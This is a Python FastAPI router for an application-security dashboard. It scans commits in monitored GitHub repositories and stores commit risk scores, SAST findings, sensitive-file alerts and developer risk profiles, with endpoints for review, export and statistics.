"""
GitHub Commit Monitor Router
Endpoints for managing monitored repos and viewing commit risk analysis.
"""
import json
import sqlite3
import logging
from datetime import datetime, timezone
from typing import List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, BackgroundTasks
from pydantic import BaseModel
from sqlalchemy.orm import Session

from models.database import get_db
from core.security import get_current_active_user
from models.models import User

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/github-monitor", tags=["github-monitor"])


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _get_db_path():
    import os
    persistent_path = "/app/data/appsec.db"
    if os.path.exists("/app/data"):
        return persistent_path
    return "appsec.db"


def _sqlite_conn():
    conn = sqlite3.connect(_get_db_path())
    conn.row_factory = sqlite3.Row
    return conn


def _get_github_pat(db: Session) -> Optional[str]:
    from routers.settings import get_setting
    return get_setting(db, "github_pat")


def _get_github_org(db: Session) -> Optional[str]:
    from routers.settings import get_setting
    return get_setting(db, "github_default_org")


async def _build_github_client(db: Session):
    from services.github_client import GitHubClient
    pat = _get_github_pat(db)
    if not pat:
        raise HTTPException(status_code=400, detail="GitHub PAT not configured. Go to Settings → GitHub Integration.")
    return GitHubClient(pat)


# ---------------------------------------------------------------------------
# Pydantic models
# ---------------------------------------------------------------------------
class GitHubSettingsRequest(BaseModel):
    github_pat: str
    default_org: Optional[str] = None


class AddRepoRequest(BaseModel):
    owner: str
    repo: str


class AcknowledgeAlertRequest(BaseModel):
    alert_id: int


# ---------------------------------------------------------------------------
# Settings endpoints
# ---------------------------------------------------------------------------
@router.get("/settings")
async def get_github_settings(
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Get GitHub integration config status."""
    from routers.settings import get_setting
    pat = get_setting(db, "github_pat")
    org = get_setting(db, "github_default_org")
    return {
        "configured": bool(pat),
        "pat_masked": f"***{pat[-4:]}" if pat and len(pat) > 4 else None,
        "default_org": org,
    }


@router.put("/settings")
async def save_github_settings(
    request: GitHubSettingsRequest,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Save GitHub PAT and default org."""
    from routers.settings import set_setting
    set_setting(db, "github_pat", request.github_pat, "GitHub Personal Access Token", is_secret=True, category="github")
    if request.default_org:
        set_setting(db, "github_default_org", request.default_org, "Default GitHub Organization", category="github")
    return {"status": "saved", "message": "GitHub settings saved successfully."}


@router.post("/settings/test")
async def test_github_connection(
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Test GitHub PAT by calling /user endpoint."""
    client = await _build_github_client(db)
    try:
        user_info = await client.test_connection()
        return {
            "status": "success",
            "github_user": user_info.get("login"),
            "message": f"Connected as {user_info.get('login')}",
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"GitHub connection failed: {str(e)}")


# ---------------------------------------------------------------------------
# Monitored Repos endpoints
# ---------------------------------------------------------------------------
@router.get("/repos")
async def list_repos(
    current_user: User = Depends(get_current_active_user),
):
    """List all monitored repos."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM github_monitored_repos ORDER BY created_at DESC")
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows


@router.post("/repos")
async def add_repo(
    request: AddRepoRequest,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Add a repository to the monitor list."""
    client = await _build_github_client(db)
    try:
        repo_info = await client.get_repo(request.owner, request.repo)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Could not fetch repo from GitHub: {str(e)}")

    conn = _sqlite_conn()
    cursor = conn.cursor()
    try:
        cursor.execute(
            """INSERT INTO github_monitored_repos
               (owner, repo, full_name, description, default_branch, added_by)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (
                request.owner,
                request.repo,
                repo_info.get("full_name", f"{request.owner}/{request.repo}"),
                repo_info.get("description", ""),
                repo_info.get("default_branch", "main"),
                current_user.email,
            )
        )
        conn.commit()
        repo_id = cursor.lastrowid
    except sqlite3.IntegrityError:
        conn.close()
        raise HTTPException(status_code=409, detail="Repository is already being monitored.")
    conn.close()
    return {"id": repo_id, "message": f"Now monitoring {request.owner}/{request.repo}"}


@router.delete("/repos/{repo_id}")
async def remove_repo(
    repo_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Remove a monitored repository."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM github_monitored_repos WHERE id = ?", (repo_id,))
    conn.commit()
    conn.close()
    return {"message": "Repository removed from monitoring."}


# ---------------------------------------------------------------------------
# Scan endpoints
# ---------------------------------------------------------------------------
async def _scan_repo(repo_id: int, db: Session):
    """Background task: fetch and analyze commits for one repo."""
    from services.commit_analyzer import CommitAnalyzer

    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM github_monitored_repos WHERE id = ?", (repo_id,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        logger.warning(f"[GitHub Monitor] Repo {repo_id} not found")
        return

    repo = dict(row)
    owner = repo["owner"]
    repo_name = repo["repo"]
    default_branch = repo.get("default_branch", "main")

    client_pat = _get_github_pat(db)
    if not client_pat:
        logger.error("[GitHub Monitor] No PAT configured")
        conn.close()
        return

    from services.github_client import GitHubClient
    client = GitHubClient(client_pat)
    analyzer = CommitAnalyzer(_get_db_path())

    try:
        commits = await client.get_recent_commits(owner, repo_name, since_hours=24, branch=default_branch)
        logger.info(f"[GitHub Monitor] {owner}/{repo_name}: {len(commits)} commits to scan")
    except Exception as e:
        logger.error(f"[GitHub Monitor] Failed to fetch commits: {e}")
        conn.close()
        return

    scanned = 0
    for commit_summary in commits:
        sha = commit_summary["sha"]

        # Skip already scanned
        cursor.execute("SELECT id FROM github_commit_scans WHERE repo_id=? AND sha=?", (repo_id, sha))
        if cursor.fetchone():
            continue

        try:
            commit_detail = await client.get_commit_detail(owner, repo_name, sha)
            diff_text = await client.get_commit_diff(owner, repo_name, sha)
        except Exception as e:
            logger.warning(f"[GitHub Monitor] Skipping commit {sha[:8]}: {e}")
            continue

        result = analyzer.analyze_commit(commit_detail, diff_text)

        commit_info = commit_detail.get("commit", {})
        author_info = commit_info.get("author", {})
        committer_info = commit_info.get("committer", {})
        stats = commit_detail.get("stats", {})

        cursor.execute(
            """INSERT OR IGNORE INTO github_commit_scans
               (repo_id, sha, author_name, author_email, committer_name, committer_email,
                commit_message, committed_at, files_changed, additions, deletions,
                risk_score, risk_level, signals)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                repo_id, sha,
                author_info.get("name", ""),
                author_info.get("email", ""),
                committer_info.get("name", ""),
                committer_info.get("email", ""),
                commit_info.get("message", "")[:500],
                author_info.get("date", ""),
                len(commit_detail.get("files", [])),
                stats.get("additions", 0),
                stats.get("deletions", 0),
                result.risk_score,
                result.risk_level,
                json.dumps(result.signals),
            )
        )
        scan_id = cursor.lastrowid
        conn.commit()

        # Store SAST findings
        for finding in result.findings:
            cursor.execute(
                """INSERT INTO github_commit_findings
                   (scan_id, rule_name, rule_id, severity, file_path, line_number, matched_text, category)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (scan_id, finding.rule_name, finding.rule_id, finding.severity,
                 finding.file_path, finding.line_number, finding.matched_text, finding.category)
            )

        # Store sensitive file alerts
        for alert in result.sensitive_files:
            cursor.execute(
                """INSERT INTO github_sensitive_file_alerts
                   (scan_id, file_path, pattern_matched, author_email, committed_at)
                   VALUES (?, ?, ?, ?, ?)""",
                (scan_id, alert.file_path, alert.pattern_matched,
                 author_info.get("email", ""), author_info.get("date", ""))
            )

        # Update developer profile
        author_email = author_info.get("email", "")
        author_name = author_info.get("name", "")
        if author_email:
            cursor.execute("SELECT id, total_commits, high_risk_commits, total_findings, avg_risk_score FROM github_developer_profiles WHERE author_email=?", (author_email,))
            dev = cursor.fetchone()
            is_high_risk = result.risk_level in ("high", "critical")
            if dev:
                new_total = dev["total_commits"] + 1
                new_high = dev["high_risk_commits"] + (1 if is_high_risk else 0)
                new_findings = dev["total_findings"] + len(result.findings)
                new_avg = round((dev["avg_risk_score"] * dev["total_commits"] + result.risk_score) / new_total, 2)
                cursor.execute(
                    """UPDATE github_developer_profiles
                       SET total_commits=?, high_risk_commits=?, total_findings=?, avg_risk_score=?,
                           last_commit_at=?, author_name=?, updated_at=datetime('now')
                       WHERE author_email=?""",
                    (new_total, new_high, new_findings, new_avg,
                     author_info.get("date", ""), author_name, author_email)
                )
            else:
                cursor.execute(
                    """INSERT INTO github_developer_profiles
                       (author_email, author_name, total_commits, high_risk_commits, total_findings,
                        avg_risk_score, last_commit_at)
                       VALUES (?, ?, ?, ?, ?, ?, ?)""",
                    (author_email, author_name, 1, 1 if is_high_risk else 0,
                     len(result.findings), result.risk_score, author_info.get("date", ""))
                )

        conn.commit()
        scanned += 1

    # Update last_scanned_at and total count
    cursor.execute(
        """UPDATE github_monitored_repos
           SET last_scanned_at=datetime('now'),
               total_commits_scanned=total_commits_scanned+?
           WHERE id=?""",
        (scanned, repo_id)
    )
    conn.commit()
    conn.close()
    logger.info(f"[GitHub Monitor] {owner}/{repo_name}: scanned {scanned} new commits")


@router.post("/scan/{repo_id}")
async def scan_repo(
    repo_id: int,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Trigger a manual scan of a monitored repository."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM github_monitored_repos WHERE id=?", (repo_id,))
    if not cursor.fetchone():
        conn.close()
        raise HTTPException(status_code=404, detail="Repository not found.")
    conn.close()

    # Validate PAT exists before queuing
    pat = _get_github_pat(db)
    if not pat:
        raise HTTPException(status_code=400, detail="GitHub PAT not configured.")

    background_tasks.add_task(_scan_repo, repo_id, db)
    return {"message": "Scan queued. Results will appear in the Commit Feed shortly."}


@router.post("/scan-all")
async def scan_all_repos(
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Scan all active monitored repositories."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM github_monitored_repos WHERE active=1")
    repo_ids = [r["id"] for r in cursor.fetchall()]
    conn.close()

    for rid in repo_ids:
        background_tasks.add_task(_scan_repo, rid, db)

    return {"message": f"Queued scans for {len(repo_ids)} repositories."}


# ---------------------------------------------------------------------------
# Commit Feed endpoints
# ---------------------------------------------------------------------------
@router.get("/commits")
async def list_commits(
    repo_id: Optional[int] = None,
    risk_level: Optional[str] = None,
    author: Optional[str] = None,
    date_from: Optional[str] = None,
    date_to: Optional[str] = None,
    show_false_positives: bool = Query(default=False),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=25, le=100),
    current_user: User = Depends(get_current_active_user),
):
    """Paginated commit feed with filters."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    conditions = []
    params = []

    if repo_id is not None:
        conditions.append("gcs.repo_id = ?")
        params.append(repo_id)
    if risk_level:
        conditions.append("gcs.risk_level = ?")
        params.append(risk_level)
    if author:
        conditions.append("(gcs.author_email LIKE ? OR gcs.author_name LIKE ?)")
        params.extend([f"%{author}%", f"%{author}%"])
    if date_from:
        conditions.append("date(gcs.committed_at) >= ?")
        params.append(date_from)
    if date_to:
        conditions.append("date(gcs.committed_at) <= ?")
        params.append(date_to)
    if not show_false_positives:
        conditions.append("(gcs.false_positive IS NULL OR gcs.false_positive = 0)")

    where_clause = f"WHERE {' AND '.join(conditions)}" if conditions else ""
    offset = (page - 1) * page_size

    cursor.execute(
        f"""SELECT gcs.*, gmr.full_name as repo_full_name,
               (SELECT COUNT(*) FROM github_commit_findings WHERE scan_id=gcs.id AND (false_positive IS NULL OR false_positive=0)) as finding_count,
               (SELECT COUNT(*) FROM github_sensitive_file_alerts WHERE scan_id=gcs.id) as sensitive_file_count
            FROM github_commit_scans gcs
            JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
            {where_clause}
            ORDER BY gcs.committed_at DESC
            LIMIT ? OFFSET ?""",
        params + [page_size, offset]
    )
    rows = [dict(r) for r in cursor.fetchall()]

    # Count
    cursor.execute(
        f"""SELECT COUNT(*) FROM github_commit_scans gcs
            JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
            {where_clause}""",
        params
    )
    total = cursor.fetchone()[0]

    conn.close()

    # Parse signals JSON
    for row in rows:
        if row.get("signals"):
            try:
                row["signals"] = json.loads(row["signals"])
            except Exception:
                row["signals"] = []

    return {
        "commits": rows,
        "total": total,
        "page": page,
        "page_size": page_size,
        "total_pages": (total + page_size - 1) // page_size,
    }


@router.get("/commits/{scan_id}")
async def get_commit_detail(
    scan_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Get a single commit scan with its findings and sensitive file alerts."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    cursor.execute(
        """SELECT gcs.*, gmr.full_name as repo_full_name, gmr.owner, gmr.repo
           FROM github_commit_scans gcs
           JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
           WHERE gcs.id = ?""",
        (scan_id,)
    )
    row = cursor.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Commit scan not found.")
    scan = dict(row)
    if scan.get("signals"):
        try:
            scan["signals"] = json.loads(scan["signals"])
        except Exception:
            scan["signals"] = []

    # JOIN findings with custom_rules to get description, cwe, owasp, remediation
    cursor.execute("""
        SELECT
            gcf.id, gcf.scan_id, gcf.rule_name, gcf.rule_id, gcf.severity,
            gcf.file_path, gcf.line_number, gcf.matched_text, gcf.category, gcf.created_at,
            cr.description AS rule_description,
            cr.cwe,
            cr.owasp,
            cr.remediation
        FROM github_commit_findings gcf
        LEFT JOIN custom_rules cr ON gcf.rule_id = cr.id
        WHERE gcf.scan_id = ?
        ORDER BY
            CASE gcf.severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END
    """, (scan_id,))
    findings = [dict(r) for r in cursor.fetchall()]

    cursor.execute("SELECT * FROM github_sensitive_file_alerts WHERE scan_id=?", (scan_id,))
    sensitive_files = [dict(r) for r in cursor.fetchall()]

    # Fetch existing AI analysis if any (table may not exist on older deployments)
    ai_analysis = None
    try:
        cursor.execute("SELECT * FROM github_commit_ai_analysis WHERE scan_id=?", (scan_id,))
        ai_row = cursor.fetchone()
        if ai_row:
            ai_analysis = dict(ai_row)
            for field in ("key_indicators", "recommended_actions"):
                if ai_analysis.get(field):
                    try:
                        ai_analysis[field] = json.loads(ai_analysis[field])
                    except Exception:
                        pass
    except Exception:
        pass  # Table not yet created; migration will run on next restart

    conn.close()
    return {**scan, "findings": findings, "sensitive_file_alerts": sensitive_files, "ai_analysis": ai_analysis}


# ---------------------------------------------------------------------------
# False Positive management
# ---------------------------------------------------------------------------
@router.post("/commits/{scan_id}/mark-false-positive")
async def mark_commit_false_positive(
    scan_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Mark an entire commit scan as false positive (suppresses it from the feed)."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute(
        """UPDATE github_commit_scans
           SET false_positive=1, reviewed_by=?, reviewed_at=datetime('now'), risk_level='false_positive'
           WHERE id=?""",
        (current_user.email, scan_id)
    )
    # Also mark all findings as FP
    cursor.execute("UPDATE github_commit_findings SET false_positive=1 WHERE scan_id=?", (scan_id,))
    conn.commit()
    conn.close()
    return {"message": "Commit marked as false positive."}


@router.post("/commits/{scan_id}/unmark-false-positive")
async def unmark_commit_false_positive(
    scan_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Restore a commit scan from false positive status."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    # Recalculate risk_level from risk_score
    cursor.execute("SELECT risk_score FROM github_commit_scans WHERE id=?", (scan_id,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Commit not found.")
    score = row[0] or 0
    if score >= 7.0:
        level = "critical"
    elif score >= 5.0:
        level = "high"
    elif score >= 3.0:
        level = "medium"
    elif score >= 1.0:
        level = "low"
    else:
        level = "clean"
    cursor.execute(
        "UPDATE github_commit_scans SET false_positive=0, reviewed_by=NULL, reviewed_at=NULL, risk_level=? WHERE id=?",
        (level, scan_id)
    )
    cursor.execute("UPDATE github_commit_findings SET false_positive=0 WHERE scan_id=?", (scan_id,))
    conn.commit()
    conn.close()
    return {"message": "False positive removed.", "risk_level": level}


@router.post("/findings/{finding_id}/mark-false-positive")
async def mark_finding_false_positive(
    finding_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Mark a single finding as false positive."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("UPDATE github_commit_findings SET false_positive=1 WHERE id=?", (finding_id,))
    conn.commit()
    conn.close()
    return {"message": "Finding marked as false positive."}


@router.post("/findings/{finding_id}/unmark-false-positive")
async def unmark_finding_false_positive(
    finding_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Remove false positive flag from a finding."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("UPDATE github_commit_findings SET false_positive=0 WHERE id=?", (finding_id,))
    conn.commit()
    conn.close()
    return {"message": "Finding restored."}


# ---------------------------------------------------------------------------
# All findings across commits (historical findings view)
# ---------------------------------------------------------------------------
@router.get("/findings")
async def list_findings(
    repo_id: Optional[int] = None,
    severity: Optional[str] = None,
    rule_name: Optional[str] = None,
    author: Optional[str] = None,
    date_from: Optional[str] = None,
    date_to: Optional[str] = None,
    show_false_positives: bool = Query(default=False),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=50, le=200),
    current_user: User = Depends(get_current_active_user),
):
    """Paginated all-findings view across all commits."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    conditions = ["1=1"]
    params = []

    if repo_id is not None:
        conditions.append("gmr.id = ?")
        params.append(repo_id)
    if severity:
        conditions.append("gcf.severity = ?")
        params.append(severity)
    if rule_name:
        conditions.append("gcf.rule_name LIKE ?")
        params.append(f"%{rule_name}%")
    if author:
        conditions.append("(gcs.author_email LIKE ? OR gcs.author_name LIKE ?)")
        params.extend([f"%{author}%", f"%{author}%"])
    if date_from:
        conditions.append("date(gcs.committed_at) >= ?")
        params.append(date_from)
    if date_to:
        conditions.append("date(gcs.committed_at) <= ?")
        params.append(date_to)
    if not show_false_positives:
        conditions.append("(gcf.false_positive IS NULL OR gcf.false_positive = 0)")

    where_clause = "WHERE " + " AND ".join(conditions)
    offset = (page - 1) * page_size

    cursor.execute(f"""
        SELECT
            gcf.id, gcf.scan_id, gcf.rule_name, gcf.rule_id, gcf.severity,
            gcf.file_path, gcf.line_number, gcf.matched_text, gcf.category,
            gcf.false_positive, gcf.created_at,
            gcs.sha, gcs.author_name, gcs.author_email, gcs.committed_at,
            gcs.risk_score, gcs.risk_level,
            gmr.full_name as repo_full_name,
            cr.description AS rule_description, cr.cwe, cr.owasp, cr.remediation
        FROM github_commit_findings gcf
        JOIN github_commit_scans gcs ON gcf.scan_id = gcs.id
        JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
        LEFT JOIN custom_rules cr ON gcf.rule_id = cr.id
        {where_clause}
        ORDER BY gcs.committed_at DESC, CASE gcf.severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END
        LIMIT ? OFFSET ?
    """, params + [page_size, offset])
    rows = [dict(r) for r in cursor.fetchall()]

    cursor.execute(f"""
        SELECT COUNT(*) FROM github_commit_findings gcf
        JOIN github_commit_scans gcs ON gcf.scan_id = gcs.id
        JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
        LEFT JOIN custom_rules cr ON gcf.rule_id = cr.id
        {where_clause}
    """, params)
    total = cursor.fetchone()[0]

    conn.close()
    return {"findings": rows, "total": total, "page": page, "page_size": page_size,
            "total_pages": (total + page_size - 1) // page_size}


@router.get("/findings/export-csv")
async def export_findings_csv(
    repo_id: Optional[int] = None,
    severity: Optional[str] = None,
    rule_name: Optional[str] = None,
    author: Optional[str] = None,
    date_from: Optional[str] = None,
    date_to: Optional[str] = None,
    show_false_positives: bool = Query(default=False),
    current_user: User = Depends(get_current_active_user),
):
    """Export all findings as CSV."""
    import io, csv
    from fastapi.responses import StreamingResponse as SR

    conn = _sqlite_conn()
    cursor = conn.cursor()

    conditions = ["1=1"]
    params = []
    if repo_id is not None:
        conditions.append("gmr.id = ?"); params.append(repo_id)
    if severity:
        conditions.append("gcf.severity = ?"); params.append(severity)
    if rule_name:
        conditions.append("gcf.rule_name LIKE ?"); params.append(f"%{rule_name}%")
    if author:
        conditions.append("(gcs.author_email LIKE ? OR gcs.author_name LIKE ?)")
        params.extend([f"%{author}%", f"%{author}%"])
    if date_from:
        conditions.append("date(gcs.committed_at) >= ?"); params.append(date_from)
    if date_to:
        conditions.append("date(gcs.committed_at) <= ?"); params.append(date_to)
    if not show_false_positives:
        conditions.append("(gcf.false_positive IS NULL OR gcf.false_positive = 0)")

    cursor.execute(f"""
        SELECT gcf.severity, gcf.rule_name, gcf.file_path, gcf.line_number,
               gcf.matched_text, gcf.false_positive, gcs.sha, gcs.author_name,
               gcs.author_email, gcs.committed_at, gcs.risk_score, gcs.risk_level,
               gmr.full_name as repo, cr.cwe, cr.owasp
        FROM github_commit_findings gcf
        JOIN github_commit_scans gcs ON gcf.scan_id = gcs.id
        JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
        LEFT JOIN custom_rules cr ON gcf.rule_id = cr.id
        WHERE {' AND '.join(conditions)}
        ORDER BY gcs.committed_at DESC
        LIMIT 10000
    """, params)
    rows = cursor.fetchall()
    conn.close()

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["severity", "rule_name", "file_path", "line_number", "matched_text",
                     "false_positive", "commit_sha", "author_name", "author_email",
                     "committed_at", "risk_score", "risk_level", "repo", "cwe", "owasp"])
    for r in rows:
        writer.writerow(list(r))

    output.seek(0)
    return SR(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=findings_export.csv"}
    )


# ---------------------------------------------------------------------------
# Developer profiles
# ---------------------------------------------------------------------------
@router.get("/developers")
async def list_developers(
    current_user: User = Depends(get_current_active_user),
):
    """List developer risk profiles."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM github_developer_profiles ORDER BY avg_risk_score DESC"
    )
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows


@router.get("/developers/{author_email:path}")
async def get_developer(
    author_email: str,
    current_user: User = Depends(get_current_active_user),
):
    """Get a single developer's profile and recent commits."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM github_developer_profiles WHERE author_email=?", (author_email,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Developer not found.")
    profile = dict(row)

    cursor.execute(
        """SELECT gcs.*, gmr.full_name as repo_full_name
           FROM github_commit_scans gcs
           JOIN github_monitored_repos gmr ON gcs.repo_id=gmr.id
           WHERE gcs.author_email=?
           ORDER BY gcs.committed_at DESC LIMIT 20""",
        (author_email,)
    )
    commits = [dict(r) for r in cursor.fetchall()]
    for c in commits:
        if c.get("signals"):
            try:
                c["signals"] = json.loads(c["signals"])
            except Exception:
                c["signals"] = []

    conn.close()
    return {**profile, "recent_commits": commits}


# ---------------------------------------------------------------------------
# Sensitive file alerts
# ---------------------------------------------------------------------------
@router.get("/alerts/sensitive-files")
async def list_sensitive_file_alerts(
    acknowledged: Optional[bool] = None,
    current_user: User = Depends(get_current_active_user),
):
    """List sensitive file access alerts."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    if acknowledged is None:
        cursor.execute(
            """SELECT gsfa.*, gcs.sha, gmr.full_name as repo_full_name
               FROM github_sensitive_file_alerts gsfa
               JOIN github_commit_scans gcs ON gsfa.scan_id=gcs.id
               JOIN github_monitored_repos gmr ON gcs.repo_id=gmr.id
               ORDER BY gsfa.created_at DESC"""
        )
    else:
        cursor.execute(
            """SELECT gsfa.*, gcs.sha, gmr.full_name as repo_full_name
               FROM github_sensitive_file_alerts gsfa
               JOIN github_commit_scans gcs ON gsfa.scan_id=gcs.id
               JOIN github_monitored_repos gmr ON gcs.repo_id=gmr.id
               WHERE gsfa.acknowledged=?
               ORDER BY gsfa.created_at DESC""",
            (1 if acknowledged else 0,)
        )
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows


@router.post("/alerts/sensitive-files/{alert_id}/acknowledge")
async def acknowledge_alert(
    alert_id: int,
    current_user: User = Depends(get_current_active_user),
):
    """Mark a sensitive file alert as acknowledged."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("UPDATE github_sensitive_file_alerts SET acknowledged=1 WHERE id=?", (alert_id,))
    conn.commit()
    conn.close()
    return {"message": "Alert acknowledged."}


# ---------------------------------------------------------------------------
# Summary / dashboard stats
# ---------------------------------------------------------------------------
@router.get("/summary")
async def get_summary(
    current_user: User = Depends(get_current_active_user),
):
    """Dashboard summary statistics."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    def fetchone_val(sql, params=()):
        cursor.execute(sql, params)
        row = cursor.fetchone()
        return row[0] if row else 0

    total_repos = fetchone_val("SELECT COUNT(*) FROM github_monitored_repos WHERE active=1")
    total_commits = fetchone_val("SELECT COUNT(*) FROM github_commit_scans")
    high_risk = fetchone_val("SELECT COUNT(*) FROM github_commit_scans WHERE risk_level IN ('high','critical')")
    total_findings = fetchone_val("SELECT COUNT(*) FROM github_commit_findings")
    unack_alerts = fetchone_val("SELECT COUNT(*) FROM github_sensitive_file_alerts WHERE acknowledged=0")
    at_risk_devs = fetchone_val("SELECT COUNT(*) FROM github_developer_profiles WHERE avg_risk_score >= 4.0")

    # Recent high-risk commits (last 5)
    cursor.execute(
        """SELECT gcs.sha, gcs.author_name, gcs.author_email, gcs.risk_score, gcs.risk_level,
                  gcs.committed_at, gcs.signals, gmr.full_name as repo_full_name
           FROM github_commit_scans gcs
           JOIN github_monitored_repos gmr ON gcs.repo_id=gmr.id
           WHERE gcs.risk_level IN ('high','critical')
           ORDER BY gcs.committed_at DESC LIMIT 5"""
    )
    recent_high_risk = [dict(r) for r in cursor.fetchall()]
    for c in recent_high_risk:
        if c.get("signals"):
            try:
                c["signals"] = json.loads(c["signals"])
            except Exception:
                c["signals"] = []

    conn.close()
    return {
        "total_monitored_repos": total_repos,
        "total_commits_scanned": total_commits,
        "high_risk_commits": high_risk,
        "total_findings": total_findings,
        "unacknowledged_alerts": unack_alerts,
        "at_risk_developers": at_risk_devs,
        "recent_high_risk_commits": recent_high_risk,
    }


# ---------------------------------------------------------------------------
# Per-repo risk stats (Overview tab)
# ---------------------------------------------------------------------------
@router.get("/repos/stats")
async def get_repo_stats(
    current_user: User = Depends(get_current_active_user),
):
    """Per-repo risk distribution — powers the Overview tab repo cards."""
    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT
            gmr.id,
            gmr.full_name,
            gmr.owner,
            gmr.repo,
            gmr.last_scanned_at,
            gmr.total_commits_scanned,
            gmr.default_branch,
            COUNT(gcs.id) as total_scanned,
            COUNT(CASE WHEN gcs.risk_level='clean'    THEN 1 END) as clean_count,
            COUNT(CASE WHEN gcs.risk_level='low'      THEN 1 END) as low_count,
            COUNT(CASE WHEN gcs.risk_level='medium'   THEN 1 END) as medium_count,
            COUNT(CASE WHEN gcs.risk_level='high'     THEN 1 END) as high_count,
            COUNT(CASE WHEN gcs.risk_level='critical' THEN 1 END) as critical_count,
            COALESCE(MAX(gcs.risk_score), 0)  as peak_risk_score,
            COALESCE(AVG(gcs.risk_score), 0)  as avg_risk_score,
            (SELECT COUNT(*) FROM github_sensitive_file_alerts gsfa
             JOIN github_commit_scans gcs2 ON gsfa.scan_id=gcs2.id
             WHERE gcs2.repo_id=gmr.id AND gsfa.acknowledged=0) as open_alerts
        FROM github_monitored_repos gmr
        LEFT JOIN github_commit_scans gcs ON gcs.repo_id = gmr.id
        WHERE gmr.active=1
        GROUP BY gmr.id
        ORDER BY (COUNT(CASE WHEN gcs.risk_level='critical' THEN 1 END) +
                  COUNT(CASE WHEN gcs.risk_level='high' THEN 1 END)) DESC
    """)
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return rows


# ---------------------------------------------------------------------------
# 14-day Risk Timeline (Timeline tab)
# ---------------------------------------------------------------------------
@router.get("/timeline")
async def get_risk_timeline(
    days: int = Query(default=14, le=30),
    repo_id: Optional[int] = None,
    current_user: User = Depends(get_current_active_user),
):
    """14-day commit risk heatmap data — powers the Timeline tab."""
    from datetime import date, timedelta

    conn = _sqlite_conn()
    cursor = conn.cursor()

    params = []
    repo_filter = ""
    if repo_id is not None:
        repo_filter = "AND gcs.repo_id = ?"
        params.append(repo_id)

    cursor.execute(f"""
        SELECT
            date(gcs.committed_at) as commit_date,
            gcs.risk_level,
            COUNT(*) as commit_count
        FROM github_commit_scans gcs
        WHERE gcs.committed_at >= date('now', '-{days} days')
        {repo_filter}
        GROUP BY commit_date, gcs.risk_level
        ORDER BY commit_date ASC
    """, params)
    rows = cursor.fetchall()
    conn.close()

    # Build a full 14-day date range (fill gaps with zeros)
    today = date.today()
    day_list = [(today - timedelta(days=days - 1 - i)).isoformat() for i in range(days)]

    empty = {"clean": 0, "low": 0, "medium": 0, "high": 0, "critical": 0}
    totals_by_day = {d: dict(empty) for d in day_list}

    for row in rows:
        d = row[0]
        level = row[1]
        count = row[2]
        if d in totals_by_day and level in totals_by_day[d]:
            totals_by_day[d][level] += count

    return {
        "days": day_list,
        "totals_by_day": totals_by_day,
    }


# ---------------------------------------------------------------------------
